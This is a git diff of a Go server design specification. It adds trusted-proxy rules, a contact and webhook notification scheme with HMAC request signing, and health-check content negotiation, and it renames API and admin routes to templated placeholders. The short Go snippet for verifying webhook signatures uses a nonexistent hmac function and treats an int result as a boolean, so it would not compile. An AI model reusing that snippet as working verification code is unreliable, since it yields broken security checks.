+| `fc00::/7` | RFC 4193 IPv6 unique-local |
+| `169.254.0.0/16`, `fe80::/10` | Link-local |
+| Same `/24` as the configured listen address (containerized deployments) | Reverse-proxy sidecar pattern |
+
+**`additional` allow-list:** add public IPs / CIDRs of upstream proxies hosted on routable networks (CDN edge, cloud load balancer, public reverse proxy). Format is mixed `IP` / `CIDR` / DNS name (resolved at startup and refreshed every 5 minutes). Example:
+
+```yaml
+server:
+  trusted_proxies:
+    additional:
+      - 203.0.113.10           # specific edge node
+      - 198.51.100.0/24        # CDN PoP block
+      - lb.internal.example    # DNS name, resolved every 5min
+```
+
+**On a public-facing direct deployment (no proxy in front)** leave `additional: []`. The X-Forwarded headers from random internet peers are then dropped, falling back to `r.Host` and `r.RemoteAddr` for URL construction — exactly the behavior we want.
 
 ## Session Configuration
 
@@ -15959,6 +17103,143 @@ server:
     default_language: en
     supported: [en]
 ```
+
+## Contact Configuration (Server Notification Recipients)
+
+**One unified config tree for every "where do messages go" decision the server makes — admin notifications, security reports, contact-form submissions. Each role supports email AND any number of webhook transports (Telegram, Discord, Slack, generic). Empty role-specific email falls back to the admin address. There is one knob to set (`server.contact.admin.email`); everything else is optional.**
+
+### Schema
+
+```yaml
+server:
+  contact:
+    # ---- Admin (server notifications) ----
+    # Recipient for server-internal alerts: error rate spike, cluster split,
+    # cert renewal failure, scheduled task crash, backup failure, etc.
+    # NEVER public. Used as the universal fallback when a role-specific
+    # address is empty.
+    admin:
+      email: "admin@{fqdn}"
+      webhooks:
+        telegram: ""        # https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT}
+        discord: ""         # https://discord.com/api/webhooks/{ID}/{TOKEN}
+        slack: ""           # https://hooks.slack.com/services/{T}/{B}/{X}
+        generic: ""         # any URL — POSTed JSON {role,event,subject,body,severity,timestamp}
+
+    # ---- Security (vulnerability reports) ----
+    # Recipient for incoming security reports. Public — surfaced in
+    # security.txt's `Contact:` mailto and in the PGP keypair's UID.
+    # Default is "security@{fqdn}" per RFC 2142 (the canonical role
+    # mailbox for security issues, also referenced by RFC 9116).
+    # Operator can override to a personal address; if explicitly
+    # set to "" it falls back to admin.email (and admin.webhooks).
+    security:
+      email: "security@{fqdn}"   # RFC 2142 standard role mailbox
+      webhooks:
+        telegram: ""
+        discord: ""
+        slack: ""
+        generic: ""
+
+    # ---- General (public contact form) ----
+    # Recipient for /server/contact submissions (non-security). Public
+    # surface — appears as the "Contact us" email if the contact page
+    # exposes one.
+    # If empty: falls back to admin.email.
+    general:
+      email: ""             # default: server.contact.admin.email
+      webhooks:
+        telegram: ""
+        discord: ""
+        slack: ""
+        generic: ""
+```
+
+### Resolution Order Per Role
+
+| Role | Resolution |
+|------|------------|
+| `admin` | Required. Empty → startup warning. The very first server admin's profile email is auto-populated here on first install if unset. |
+| `security` | `server.contact.security.email` (default `security@{fqdn}` per RFC 2142). If explicitly set to `""`, falls back to `server.contact.admin.email`. Same fallback for each webhook transport (security.webhooks.telegram → admin.webhooks.telegram). |
+| `general` | `server.contact.general.email` if set → else `server.contact.admin.email`. Same fallback for webhooks. |
+
+**Effective recipient is computed once per dispatch, not cached across requests** — operator can change `general.email` and the next contact-form submission picks it up without restart.
+
+### Webhook Transports
+
+**Each role's `webhooks` map can hold any number of named transports. Built-in adapters cover the common ones; `generic` POSTs raw JSON for everything else.**
+
+| Transport | Format expected | Server adapts to |
+|-----------|------------------|-------------------|
+| `telegram` | Bot HTTP API URL with `chat_id` query param | `POST {url}&text={urlencoded message}` |
+| `discord` | Webhook URL | `POST {url}` body `{"content": "<message>", "username": "{app_name}"}` |
+| `slack` | Incoming Webhook URL | `POST {url}` body `{"text": "<message>"}` |
+| `mattermost` | Incoming Webhook URL | Slack-compatible body |
+| `pushover` | Pushover API URL with `user`/`token` | Standard Pushover params |
+| `gotify` | Gotify URL | `POST {url}/message?token={token}` body `{"title", "message", "priority"}` |
+| `generic` | Any HTTPS URL | `POST {url}` JSON body: `{role, event, subject, body, severity, timestamp, project_name, project_version, app_url, tracking_id?}` |
+
+**Additional transports can be plugged in by adding adapters in `src/notify/`. The config schema above is open — any key under `webhooks` is treated as a transport name, and the adapter for that name is invoked.**
+
+**Outbound webhook signing (defense against URL leaks):**
+
+Every outbound webhook POST includes these headers so the receiver can verify the request actually came from this server (not a forger who learned the URL):
+
+| Header | Value |
+|--------|-------|
+| `X-Webhook-Signature` | `sha256=<hex_hmac>` where `hmac = HMAC-SHA256(per_webhook_secret, request_body_bytes)`. The `per_webhook_secret` is auto-generated when the webhook URL is first saved (random 32 bytes, persisted in `server.yml` next to the URL as `webhooks.<name>_secret`) and shown ONCE in the admin panel for the operator to configure on the receiving end. |
+| `X-Webhook-Timestamp` | Unix seconds — receiver SHOULD reject if delta exceeds `±5 min` to prevent replay |
+| `X-Webhook-ID` | UUID v7 (PART 13) — idempotency key the receiver can use to deduplicate retries |
+| `X-Webhook-Event` | The event type (e.g., `security.report_received`, `admin.cluster_failover`) |
+| `User-Agent` | `weather/{project_version} (+{app_url})` |
+
+The signature applies to **all** transports — even built-in adapters (Telegram, Discord, Slack) get an `X-Webhook-Signature` header in the unlikely case their endpoint is forwarded somewhere that wants to verify origin. Adapters that the target service doesn't read (Telegram doesn't care about the header) ignore it harmlessly.
+
+**Receiver verification (recommended pattern, for `generic` webhooks):**
+
+```go
+got := r.Header.Get("X-Webhook-Signature")
+want := "sha256=" + hex.EncodeToString(hmac.SHA256(secret, bodyBytes))
+if !subtle.ConstantTimeCompare([]byte(got), []byte(want)) {
+    http.Error(w, "bad signature", http.StatusForbidden)
+    return
+}
+```
+
+**Failure handling:** if a webhook returns non-2xx, the server retries with exponential backoff (1m, 5m, 15m, 1h, 6h, 24h — then drops). Retries reuse the same `X-Webhook-ID` so the receiver can dedupe. Permanent failures are logged as `notify.webhook_failed` (per-IP rate-limited so a broken receiver doesn't flood logs).
+
+### Per-Role Behavior
+
+| Role | When triggered | What is sent |
+|------|----------------|--------------|
+| `admin` | Server-internal events: error rate spike, panic, cluster failover, backup failure, cert renewal, security report received (summary only) | Subject + body + severity + a deep-link to `/{admin_path}/server/...`. NEVER includes user content. |
+| `security` | Incoming security report (full content, encrypted), researcher status update, CVE assignment milestone | PGP-encrypted body if a researcher pubkey or admin pubkey is configured (PART 11 → "GPG Keypair Management"). |
+| `general` | `/server/contact` form submission (non-security) | Sender name, sender email, subject, message body. Spam-filtered before dispatch. |
+
+### Privacy & Public Exposure
+
+| Field | Public exposure | Notes |
+|-------|------------------|-------|
+| `admin.email` | NEVER public | Server-internal recipient only. |
+| `security.email` | Public (security.txt `Contact: mailto:` line) | Researchers need to reach you. Choose carefully. Suggest a role address (`security@{fqdn}`) over a personal one. |
+| `general.email` | Public (contact form, footer "Contact us") | Same — role address recommended. |
+| Any `webhooks.*` | NEVER public | URLs contain bearer tokens / chat IDs / etc. |
+
+### Backward Compatibility
+
+The previous flat keys are accepted and migrated on first read:
+
+| Legacy key | Migrated to |
+|------------|-------------|
+| `server.contact` (string email) | `server.contact.general.email` |
+| `web.security.contact` | `server.contact.security.email` |
+| `server.admin_email` / `admin.email` | `server.contact.admin.email` |
+
+Migration writes the new structure to `server.yml` on first save and logs `config.contact_migrated`. The legacy keys are then ignored.
+
+### Admin Panel — `/{admin_path}/server/notify`
+
+Single page with three tabs (Admin / Security / General). Each tab shows email + webhooks for that role with "test" buttons that send a sample notification through every configured transport.
 
 ## Analytics Tracking 
 
@@ -16209,7 +17490,7 @@ func TrackingScript() template.HTML {
 {{ trackingScript }}
 ```
 
-### Admin Panel (/admin/server/tracking)
+### Admin Panel (/{admin_path}/server/tracking)
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -16349,6 +17630,28 @@ server:
         - condition: "user_initiated"
           when: "User explicitly shares content (social buttons, exports)"
           data: "Whatever user chooses to share"
+
+    # ============================================================
+    # PROFILE VISIBILITY (multi-user; PART 34)
+    # ============================================================
+    # Default visibility for fields on a user's public profile
+    # (`/users/{user_name}`, `/api/{api_version}/users/{user_name}`).
+    # Per-user overrides live in user_preferences. Each project's
+    # IDEA.md should declare which of these defaults make sense.
+    profile_email_public: false        # show user's email on their public profile
+    profile_real_name_public: true
+    profile_location_public: false
+    profile_bio_public: true
+    profile_links_public: true
+    profile_activity_public: true       # last-seen, recent posts, etc.
+
+    # ============================================================
+    # OPERATIONAL TELEMETRY (CSP / NEL / error reports)
+    # ============================================================
+    # Reports endpoint behavior for sensitive fields. See PART 14
+    # → "Public Reports Scope" → "Sanitization Rules".
+    hash_report_ips: true               # SHA-256(daily-rotating-salt + IP) before storage. Default true in EU; false elsewhere — operator confirms on first run.
+    report_retention_days: 90           # how long sanitized report bodies live in security.log / server.log
 
     # ============================================================
     # DATA RETENTION
@@ -16691,7 +17994,7 @@ type ConsentState struct {
 └─────────────────────────────────────────────────────────────────┘
 ```
 
-### Admin Panel (/admin/server/privacy)
+### Admin Panel (/{admin_path}/server/privacy)
 
 | Section | Elements |
 |---------|----------|
@@ -16875,7 +18178,7 @@ server:
 | Pub/Sub events | Yes | Real-time state sync |
 | Distributed locks | Yes | Prevent duplicate task execution |
 
-## Admin Panel (/admin/server/settings)
+## Admin Panel (/{admin_path}/server/settings)
 
 All settings above MUST be configurable via admin panel:
 
@@ -16899,7 +18202,7 @@ All settings above MUST be configurable via admin panel:
 
 **Endpoints:**
 - `/healthz` - Frontend route (follows PART 14 content negotiation rules)
-- `/api/v1/healthz` - API route (always JSON)
+- `/api/{api_version}/healthz` - API route (always JSON)
 
 **Content negotiation:** Follows standard frontend rules (see PART 14). No special /healthz rules.
 
@@ -17367,9 +18670,20 @@ type StatsInfo struct {
 - Use `<meta http-equiv="refresh" content="30">` or JavaScript
 - Show countdown or "Auto-refreshing in Xs" indicator
 
-#### JSON (Accept: application/json)
+#### JSON (Accept: application/json or application/health+json)
 
 **Fields in canonical order (see "Field Order & Structure" above). References template PARTS.**
+
+**Content-Type negotiation:**
+
+| Request `Accept` header | Response `Content-Type` | Body |
+|-------------------------|--------------------------|------|
+| `application/json` (default for API clients) | `application/json` | Same JSON shape below |
+| `application/health+json` | `application/health+json` | Same JSON shape below — `application/health+json` (draft-inadarei-api-health-check) is JSON with a specific media type tag for monitoring tools that match on Content-Type. The body shape is compatible: top-level `status` field is the same string. No body changes needed; only the Content-Type. |
+| `text/html` | `text/html` | HTML render of same data |
+| `text/plain` | `text/plain` | Plain-text formatted (HTML2TextConverter) |
+
+`Vary: Accept` is always set so caches don't return the wrong representation.
 
 **Note:** Only non-negotiable features shown with actual status (true/false, enabled/disabled). If project uses optional PARTS (34, 35, 36), those become non-negotiable for that project and show their actual enabled/disabled status.
 
@@ -17427,7 +18741,7 @@ type StatsInfo struct {
 }
 ```
 
-### /api/v1/healthz Security Rules 
+### /api/{api_version}/healthz Security Rules 
 
 **NEVER expose in /healthz response:**
 
@@ -17456,6 +18770,8 @@ type StatsInfo struct {
 | **Mode** | Production/development | `production` |
 
 **Rule: If in doubt, don't include it. Health checks need status, not details.**
+
+**Debug mode (`--debug` / `DEBUG=true`)** adds an `_debug` block to `/healthz` with Tier-3 detail (per PART 11 → "What Safe for Anyone to See Means"): full dependency versions, configured `db_locality` rationale, internal upstream addresses for failed checks, recent panic count + last-panic file:line, scheduler queue depth, cache hit/miss ratios. The `_debug` block is stripped in production by the Output Sanitization Pipeline.
 
 #### Plain Text (Accept: text/plain)
 
@@ -17513,7 +18829,7 @@ stats.requests_24h: 45678
 stats.active_connections: 42
 ```
 
-### /api/v1/healthz (JSON only)
+### /api/{api_version}/healthz (JSON only)
 
 Same JSON response as `/healthz` with `Accept: application/json`. Always returns JSON regardless of Accept header.
 
@@ -17635,7 +18951,7 @@ When not in cluster mode:
 ### --version Output
 
 ```
-weather 1.0.0
+weather {project_version}
 Built: {BUILD_DATE}
 Go: {GO_VERSION}
 OS/Arch: {GOOS}/{GOARCH}
@@ -17666,7 +18982,7 @@ OS/Arch: {GOOS}/{GOARCH}
 
 ## API Versioning
 
-**Use versioned API: `/api/v1`**
+**Use versioned API: `/api/{api_version}`**
 
 ## Route Compliance 
 
@@ -17676,12 +18992,12 @@ OS/Arch: {GOOS}/{GOARCH}
 
 | Rule | Requirement | Wrong | Correct |
 |------|-------------|-------|---------|
-| **Versioning** | All API routes MUST be versioned | `/api/users` | `/api/v1/users` |
-| **Plural nouns** | All resource names MUST be plural | `/api/v1/user` | `/api/v1/users` |
-| **Lowercase** | All routes MUST be lowercase | `/api/v1/Users` | `/api/v1/users` |
-| **Hyphens** | Multi-word routes use hyphens | `/api/v1/api_keys` | `/api/v1/api-keys` |
-| **No trailing slash** | Routes MUST NOT end with `/` (see PART 16 URL Normalization) | `/api/v1/users/` | `/api/v1/users` |
-| **No verbs** | Routes are nouns, not actions | `/api/v1/getUsers` | `GET /api/v1/users` |
+| **Versioning** | All API routes MUST be versioned | `/api/users` | `/api/{api_version}/users` |
+| **Plural nouns** | All resource names MUST be plural | `/api/{api_version}/user` | `/api/{api_version}/users` |
+| **Lowercase** | All routes MUST be lowercase | `/api/{api_version}/Users` | `/api/{api_version}/users` |
+| **Hyphens** | Multi-word routes use hyphens | `/api/{api_version}/api_keys` | `/api/{api_version}/api-keys` |
+| **No trailing slash** | Routes MUST NOT end with `/` (see PART 16 URL Normalization) | `/api/{api_version}/users/` | `/api/{api_version}/users` |
+| **No verbs** | Routes are nouns, not actions | `/api/{api_version}/getUsers` | `GET /api/{api_version}/users` |
 
 ### Frontend-Backend Integration 
 
@@ -17689,11 +19005,11 @@ OS/Arch: {GOOS}/{GOARCH}
 
 | API Type | Frontend Required | Example |
 |----------|-------------------|---------|
-| **User-facing features** | Yes | `/api/v1/users` → `/users` page |
-| **Admin features** | Yes | `/api/v1/admin/*` → `/admin/*` pages |
-| **Health/status** | Yes | `/healthz` has HTML frontend (with emojis), `/api/v1/healthz` is JSON |
-| **Agent endpoints** | No | `/api/v1/*/agents/*` - CLI/agent only |
-| **Cluster nodes** | No | `/api/v1/admin/server/nodes/*` - node-to-node only |
+| **User-facing features** | Yes | `/api/{api_version}/users` → `/users` page |
+| **Admin features** | Yes | `/api/{api_version}/{admin_path}/*` → `/{admin_path}/*` pages |
+| **Health/status** | Yes | `/healthz` has HTML frontend (with emojis), `/api/{api_version}/healthz` is JSON |
+| **Agent endpoints** | No | `/api/{api_version}/*/agents/*` - CLI/agent only |
+| **Cluster nodes** | No | `/api/{api_version}/{admin_path}/server/nodes/*` - node-to-node only |
 
 | Requirement | Description |
 |-------------|-------------|
@@ -17706,18 +19022,18 @@ OS/Arch: {GOOS}/{GOARCH}
 
 | Backend API | Frontend | Purpose |
 |-------------|----------|---------|
-| `GET /api/v1/users` | `GET /users` | View user profile |
-| `PATCH /api/v1/users` | `POST /users` (form) | Update user profile |
-| `GET /api/v1/users/tokens` | `GET /users/tokens` | List tokens |
-| `POST /api/v1/users/tokens` | `POST /users/tokens` (form) | Create token |
-| `DELETE /api/v1/users/tokens/{id}` | `POST /users/tokens/{id}/delete` | Delete token |
+| `GET /api/{api_version}/users` | `GET /users` | View user profile |
+| `PATCH /api/{api_version}/users` | `POST /users` (form) | Update user profile |
+| `GET /api/{api_version}/users/tokens` | `GET /users/tokens` | List tokens |
+| `POST /api/{api_version}/users/tokens` | `POST /users/tokens` (form) | Create token |
+| `DELETE /api/{api_version}/users/tokens/{id}` | `POST /users/tokens/{id}/delete` | Delete token |
 
 **API-only (no frontend needed):**
 
 | API Endpoint | Why No Frontend |
 |--------------|-----------------|
-| `/api/v1/admin/server/agents/*` | Agent binary uses directly |
-| `/api/v1/admin/server/nodes/*` | Node-to-node cluster communication |
+| `/api/{api_version}/{admin_path}/server/agents/*` | Agent binary uses directly |
+| `/api/{api_version}/{admin_path}/server/nodes/*` | Node-to-node cluster communication |
 
 ### Frontend Functionality Requirements 
 
@@ -17779,7 +19095,7 @@ This is a server application, not a client-side SPA. The server should handle as
 
 Before adding ANY route, verify:
 
-- [ ] Is it versioned? (`/api/v1/...`)
+- [ ] Is it versioned? (`/api/{api_version}/...`)
 - [ ] Is the resource name plural? (`users`, not `user`)
 - [ ] Is it lowercase with hyphens? (`api-keys`, not `API_Keys`)
 - [ ] Does the route follow scope rules? (`/auth/`, `/users/`, `/orgs/`, `/admin/`)
@@ -17794,22 +19110,22 @@ Before adding ANY route, verify:
 
 | ✓ Correct | ✗ Wrong |
 |-----------|---------|
-| `/api/v1/users` | `/api/v1/user` |
-| `/api/v1/orgs` | `/api/v1/org` |
-| `/api/v1/orgs/{slug}/members` | `/api/v1/org/{slug}/members` |
+| `/api/{api_version}/users` | `/api/{api_version}/user` |
+| `/api/{api_version}/orgs` | `/api/{api_version}/org` |
+| `/api/{api_version}/orgs/{slug}/members` | `/api/{api_version}/org/{slug}/members` |
 
 ### Route Scopes
 
 | Scope | Web Route | API Route | ID Required | Description |
 |-------|-----------|-----------|-------------|-------------|
-| **Server** | `/server/*` | `/api/v1/server/*` | No | About, privacy, contact, help, terms |
-| **Auth** | `/auth/*` | `/api/v1/auth/*` | No | Login, register, logout, OAuth |
-| **Users** | `/users/*` | `/api/v1/users/*` | **No** | Current user's resources (from session) |
-| **Orgs** | `/orgs/*` | `/api/v1/orgs/*` | **Yes** (`{slug}`) | User can own multiple orgs |
-| **Admin** | `/admin/*` | `/api/v1/admin/*` | No | Server administration |
-| **Project** | `/*` | `/api/v1/*` | Varies | Project-specific (jokes, pastes, etc.) |
+| **Server** | `/server/*` | `/api/{api_version}/server/*` | No | About, privacy, contact, help, terms |
+| **Auth** | `/auth/*` | `/api/{api_version}/auth/*` | No | Login, register, logout, OAuth |
+| **Users** | `/users/*` | `/api/{api_version}/users/*` | **No** | Current user's resources (from session) |
+| **Orgs** | `/orgs/*` | `/api/{api_version}/orgs/*` | **Yes** (`{slug}`) | User can own multiple orgs |
+| **Admin** | `/{admin_path}/*` | `/api/{api_version}/{admin_path}/*` | No | Server administration |
+| **Project** | `/*` | `/api/{api_version}/*` | Varies | Project-specific (jokes, pastes, etc.) |
 
-**Note:** Examples throughout this document use `/api/v1/` as the default value. In code, always use `APIBasePath()` or `v1` - never hardcode `v1`.
+**Note:** Examples throughout this document use `/api/{api_version}/` as the default value. In code, always use `APIBasePath()` or `{api_version}` - never hardcode `v1`.
 
 ### User Routes - No ID Required 
 
@@ -17817,19 +19133,19 @@ Before adding ANY route, verify:
 
 | Route | Description |
 |-------|-------------|
-| `GET /api/v1/users` | Current user's profile |
-| `PATCH /api/v1/users` | Update current user's profile |
-| `GET /api/v1/users/tokens` | Current user's API tokens |
-| `GET /api/v1/users/security` | Current user's security settings |
-| `GET /api/v1/users/settings` | Current user's preferences |
+| `GET /api/{api_version}/users` | Current user's profile |
+| `PATCH /api/{api_version}/users` | Update current user's profile |
+| `GET /api/{api_version}/users/tokens` | Current user's API tokens |
+| `GET /api/{api_version}/users/security` | Current user's security settings |
+| `GET /api/{api_version}/users/settings` | Current user's preferences |
 
-**Admin routes for managing OTHER users use `/admin/users/{id}`:**
+**Admin routes for managing OTHER users use `/{admin_path}/users/{id}`:**
 
 | Route | Description |
 |-------|-------------|
-| `GET /api/v1/admin/users` | List all users (admin) |
-| `GET /api/v1/admin/users/{id}` | View specific user (admin) |
-| `PATCH /api/v1/admin/users/{id}` | Edit specific user (admin) |
+| `GET /api/{api_version}/{admin_path}/users` | List all users (admin) |
+| `GET /api/{api_version}/{admin_path}/users/{id}` | View specific user (admin) |
+| `PATCH /api/{api_version}/{admin_path}/users/{id}` | Edit specific user (admin) |
 
 ### Org Routes - Slug Required 
 
@@ -17837,11 +19153,11 @@ Before adding ANY route, verify:
 
 | Route | Description |
 |-------|-------------|
-| `GET /api/v1/orgs` | List user's organizations |
-| `POST /api/v1/orgs` | Create new organization |
-| `GET /api/v1/orgs/{slug}` | Get specific org |
-| `GET /api/v1/orgs/{slug}/members` | Get org members |
-| `GET /api/v1/orgs/{slug}/settings` | Get org settings |
+| `GET /api/{api_version}/orgs` | List user's organizations |
+| `POST /api/{api_version}/orgs` | Create new organization |
+| `GET /api/{api_version}/orgs/{slug}` | Get specific org |
+| `GET /api/{api_version}/orgs/{slug}/members` | Get org members |
+| `GET /api/{api_version}/orgs/{slug}/settings` | Get org settings |
 
 ### Frontend Must Match Backend
 
@@ -17849,13 +19165,13 @@ Before adding ANY route, verify:
 
 | API Route | Frontend Route | Notes |
 |-----------|----------------|-------|
-| `/api/v1/users` | `/users` | Current user profile |
-| `/api/v1/users/tokens` | `/users/tokens` | Current user's tokens |
-| `/api/v1/users/settings` | `/users/settings` | Current user's settings |
-| `/api/v1/orgs` | `/orgs` | User's org list |
-| `/api/v1/orgs/{slug}` | `/orgs/{slug}` | Specific org |
-| `/api/v1/orgs/{slug}/members` | `/orgs/{slug}/members` | Org members |
-| `/api/v1/server/about` | `/server/about` | About page |
+| `/api/{api_version}/users` | `/users` | Current user profile |
+| `/api/{api_version}/users/tokens` | `/users/tokens` | Current user's tokens |
+| `/api/{api_version}/users/settings` | `/users/settings` | Current user's settings |
+| `/api/{api_version}/orgs` | `/orgs` | User's org list |
+| `/api/{api_version}/orgs/{slug}` | `/orgs/{slug}` | Specific org |
+| `/api/{api_version}/orgs/{slug}/members` | `/orgs/{slug}/members` | Org members |
+| `/api/{api_version}/server/about` | `/server/about` | About page |
 
 **Frontend uses same routes, different response format:**
 - Browser request → HTML page
@@ -17866,7 +19182,7 @@ Before adding ANY route, verify:
 
 | Direction | Example | Reason |
 |-----------|---------|--------|
-| **API-only** | `/api/v1/admin/server/agents/*`, `/api/v1/admin/server/nodes/*` | Machine/system use only (see table above) |
+| **API-only** | `/api/{api_version}/{admin_path}/server/agents/*`, `/api/{api_version}/{admin_path}/server/nodes/*` | Machine/system use only (see table above) |
 | **Frontend-only** | `/server` → `/server/about` redirect | UX convenience redirects, no API equivalent needed |
 
 ### ID/Slug Consistency
@@ -17887,27 +19203,27 @@ Before adding ANY route, verify:
 
 | Parameter Type | Use When | Example |
 |----------------|----------|---------|
-| **Path params** | Identifying a resource | `/api/v1/users/{username}/repos/{id}`, `/api/v1/jokes/{category}` |
+| **Path params** | Identifying a resource | `/api/{api_version}/users/{user_name}/repos/{id}`, `/api/{api_version}/jokes/{category}` |
 | **Query params** | Filtering, sorting, pagination | `?page=2&limit=10&sort=date` |
 
 **Path Parameters (Preferred):**
 ```
-GET /api/v1/users/repos/123        ✓ Good - current user's repo by ID
-GET /api/v1/users/alice/repos/123  ✓ Good - user alice's repo by ID
-GET /api/v1/orgs/acme/repos/123    ✓ Good - org acme's repo by ID
-GET /api/v1/jokes/programming      ✓ Good - category in path (project-scoped)
-GET /api/v1/search/golang          ✓ Good - search term in path
+GET /api/{api_version}/users/repos/123        ✓ Good - current user's repo by ID
+GET /api/{api_version}/users/alice/repos/123  ✓ Good - user alice's repo by ID
+GET /api/{api_version}/orgs/acme/repos/123    ✓ Good - org acme's repo by ID
+GET /api/{api_version}/jokes/programming      ✓ Good - category in path (project-scoped)
+GET /api/{api_version}/search/golang          ✓ Good - search term in path
 
-GET /api/v1/users/repos?id=123     ✗ Bad - should be path param
-GET /api/v1/jokes?category=prog    ✗ Bad - should be path param
+GET /api/{api_version}/users/repos?id=123     ✗ Bad - should be path param
+GET /api/{api_version}/jokes?category=prog    ✗ Bad - should be path param
 ```
 
 **Query Parameters (When Needed):**
 ```
-GET /api/v1/users/repos?page=2&limit=10    ✓ Pagination
-GET /api/v1/jokes?sort=rating&order=desc   ✓ Sorting (project-scoped)
-GET /api/v1/search/golang?safe=true        ✓ Filtering/options
-GET /api/v1/admin/users?status=active&role=admin ✓ Admin filters
+GET /api/{api_version}/users/repos?page=2&limit=10    ✓ Pagination
+GET /api/{api_version}/jokes?sort=rating&order=desc   ✓ Sorting (project-scoped)
+GET /api/{api_version}/search/golang?safe=true        ✓ Filtering/options
+GET /api/{api_version}/{admin_path}/users?status=active&role=admin ✓ Admin filters
 ```
 
 **Rules:**
@@ -18067,7 +19383,7 @@ function handleClick(event) {
     name: "test"
   };
 
-  fetch('/api/v1/users', {
+  fetch('/api/{api_version}/users', {
     method: 'POST',
     body: JSON.stringify(data)
   });
@@ -18113,8 +19429,8 @@ tail -c 2 file.txt | od -An -tx1
 | Endpoint | Default | Browser | curl/CLI | API Client |
 |----------|---------|---------|----------|------------|
 | `/` (public pages) | HTML | HTML | Text | HTML |
-| `/admin/*` | HTML | HTML | HTML | HTML |
-| `/api/v1/*` | JSON | JSON | Text | JSON |
+| `/{admin_path}/*` | HTML | HTML | HTML | HTML |
+| `/api/{api_version}/*` | JSON | JSON | Text | JSON |
 | `/healthz` | HTML | HTML | Text | JSON (Accept: application/json) |
 | `*.txt` extension | Text | Text | Text | Text |
 
@@ -18139,7 +19455,7 @@ tail -c 2 file.txt | od -An -tx1
 |-----------|-----------------|
 | Default (browser, API client) | JSON |
 | Non-interactive client detected | Plain text (raw data) |
-| `.txt` extension (e.g., `/api/v1/joke.txt`) | Plain text (raw data) |
+| `.txt` extension (e.g., `/api/{api_version}/joke.txt`) | Plain text (raw data) |
 | `Accept: text/plain` header | Plain text (raw data) |
 
 **API routes return raw data as plain text (NOT HTML2TextConverter) because there's no HTML to convert.**
@@ -18177,34 +19493,34 @@ func getAPIResponseFormat(r *http.Request) string {
 ```
 
 **`.txt` extension support for API routes:**
-- ✓ ALL `/api/v1/*` endpoints
-- ✓ Health API endpoints (`/api/v1/healthz`)
+- ✓ ALL `/api/{api_version}/*` endpoints
+- ✓ Health API endpoints (`/api/{api_version}/healthz`)
 - ✓ Project-specific API endpoints
-- ✓ Admin API endpoints (`/api/v1/admin/*`)
+- ✓ Admin API endpoints (`/api/{api_version}/{admin_path}/*`)
 
 **API Routes (JSON default, text via CLI/.txt/Accept header):**
 
 | Endpoint | Default | CLI Tool | With `.txt` | Accept: text/plain |
 |----------|---------|----------|-------------|-------------------|
-| `/api/v1/jokes/random` | JSON | Text | Text | Text |
-| `/api/v1/healthz` | JSON | Text | Text | Text |
-| `/api/v1/status` | JSON | Text | Text | Text |
-| `/api/v1/users/{username}` | JSON | Text | Text | Text |
+| `/api/{api_version}/jokes/random` | JSON | Text | Text | Text |
+| `/api/{api_version}/healthz` | JSON | Text | Text | Text |
+| `/api/{api_version}/status` | JSON | Text | Text | Text |
+| `/api/{api_version}/users/{user_name}` | JSON | Text | Text | Text |
 
 **Frontend Routes (smart detection):**
 
 | Endpoint | Browser | CLI/curl | Accept: text/plain | Accept: text/html |
 |----------|---------|----------|-------------------|-------------------|
 | `/jokes/random` | HTML | Text | Text | HTML |
-| `/{username}` | HTML | Text | Text | HTML |
+| `/{user_name}` | HTML | Text | Text | HTML |
 | `/healthz` | HTML | Text | Text | HTML |
 | `/` | HTML | Text | Text | HTML |
 
 **Use cases:**
 
 **API with `.txt` extension:**
-- `curl -q -LSsf https://api.example.com/api/v1/joke/random.txt` → Just the joke text
-- `curl -q -LSsf https://api.example.com/api/v1/healthz.txt` → "OK" or "ERROR: ..."
+- `curl -q -LSsf https://api.example.com/api/{api_version}/joke/random.txt` → Just the joke text
+- `curl -q -LSsf https://api.example.com/api/{api_version}/healthz.txt` → "OK" or "ERROR: ..."
 - Scripts that need plain output without JSON parsing
 
 **Frontend with smart detection:**
@@ -18220,14 +19536,14 @@ func getAPIResponseFormat(r *http.Request) string {
 
 ### Content Negotiation Priority 
 
-**For API routes (`/api/v1/*`), response format is determined in this order:**
+**For API routes (`/api/{api_version}/*`), response format is determined in this order:**
 
 | Priority | Method | Example | Returns |
 |----------|--------|---------|---------|
-| **1** | `.txt` extension | `/api/v1/joke.txt` | Plain text (ALWAYS) |
+| **1** | `.txt` extension | `/api/{api_version}/joke.txt` | Plain text (ALWAYS) |
 | **2** | `Accept: application/json` header | `Accept: application/json` | JSON |
 | **3** | `Accept: text/plain` header | `Accept: text/plain` | Plain text |
-| **4** | Default | `/api/v1/joke` | JSON |
+| **4** | Default | `/api/{api_version}/joke` | JSON |
 
 **For frontend routes (`/**`), response format is determined in this order:**
 
@@ -19006,9 +20322,9 @@ When the user requests compatibility with external services (e.g., "compatible w
    - Preserve response content-type (JSON, XML, plain text, etc.)
 
 **3. Use our standard routes for everything else:**
-   - View: Use our standard `/api/v1/{resource}/{id}` pattern
-   - List: Use our standard `/api/v1/{resource}` pattern
-   - Search: Use our standard `/api/v1/{resource}/search` pattern
+   - View: Use our standard `/api/{api_version}/{resource}/{id}` pattern
+   - List: Use our standard `/api/{api_version}/{resource}` pattern
+   - Search: Use our standard `/api/{api_version}/{resource}/search` pattern
    - DO NOT replicate their entire API surface
 
 **Example - Pastebin Compatibility:**
@@ -19038,7 +20354,7 @@ Result:
 | **Research first** | NEVER guess - look up actual API documentation |
 | **Create/init only** | Implement creation endpoints, skip view/list/search/delete duplicates |
 | **Match response format** | Field names, structure, content-type must match target exactly |
-| **Standard routes for rest** | Use our `/api/v1/*` patterns for all other operations |
+| **Standard routes for rest** | Use our `/api/{api_version}/*` patterns for all other operations |
 | **Avoid complexity** | Do NOT add hundreds of redundant routes |
 | **Document compatibility** | List what IS and ISN'T compatible in AI.md |
 
@@ -19150,7 +20466,7 @@ AI Response:
 "Pastebin.com is a simple service, not a protocol.
 I'll implement:
 ✓ POST /api/api_post.php (create endpoint)
-✗ Skip view/list/delete (use our /api/v1/* routes)
+✗ Skip view/list/delete (use our /api/{api_version}/* routes)
 
 Need additional compatible endpoints?"
 ```
@@ -19174,19 +20490,58 @@ Need additional compatible endpoints?"
 | Endpoint | Method | Auth | Description |
 |----------|--------|------|-------------|
 | `/` | GET | None | Web interface (HTML) |
-| `/healthz` | GET | None | Health check (HTML/JSON/text via content negotiation) |
-| `/openapi` | GET | None | Swagger UI |
-| `/openapi.json` | GET | None | OpenAPI spec (JSON only) |
